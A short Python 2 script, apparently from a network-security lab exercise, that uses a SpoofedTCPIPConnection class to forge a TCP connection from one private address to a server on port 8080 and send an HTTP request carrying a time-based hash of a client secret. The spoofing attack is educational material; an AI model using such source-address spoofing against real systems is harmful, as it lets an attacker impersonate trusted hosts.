#!/usr/bin/python

import codecs
import random
import time

from scapy.tools.UTscapy import sha1

from q1 import SpoofedTCPIPConnection

if __name__ == '__main__':
    src_ip = '192.168.1.17'
    src_port = random.randint(1024, 65535)
    dst_ip = '192.168.1.2'
    dst_port = 8080
    c = SpoofedTCPIPConnection(src_ip, src_port, dst_ip, dst_port)

    c.connect()
    with codecs.open("client_secret", encoding='utf-8') as f:
        client_secret = f.read().replace('\n', "")
        current_time = int(time.time()) << 3
        secret = sha1(str(client_secret) + str(current_time))
        print current_time
        c.send_data('GET / HTTP/1.0\r\n' +
                    'secret: ' + secret + '\r\n' +
                    '\r\n')
